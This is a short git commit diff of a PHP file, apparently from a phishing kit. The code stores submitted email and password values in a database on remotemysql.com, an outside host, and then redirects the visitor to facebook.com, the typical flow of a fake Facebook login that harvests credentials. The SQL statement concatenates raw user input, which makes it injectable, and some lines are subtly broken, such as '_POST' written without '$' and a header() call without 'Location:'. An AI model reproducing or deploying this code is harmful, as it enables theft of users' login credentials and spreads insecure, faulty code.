cb3a61cf9e6d322dd9e2d64c7839f024e5766c40
agentwolf6471 <idcidc6471@gmail.com>
2019-05-30 13:08:50 +0800

    first commit

--- web/index.php
+++ web/index.php
@@ -8,7 +8,7 @@ $server="remotemysql.com";
 $port=3360;
 
 
-	 $conn = mysqli_connect("remotemysql.com", $username, $password, "	04apsgRlJ4");
+	 $conn = mysqli_connect("remotemysql.com", $username, $password, "04apsgRlJ4");
 		$result = mysqli_query($conn, "INSERT INTO user (username,password) VALUES ("._POST["email"].","._POST["pass"].");");
 		header("https://www.facebook.com/");
 		exit();
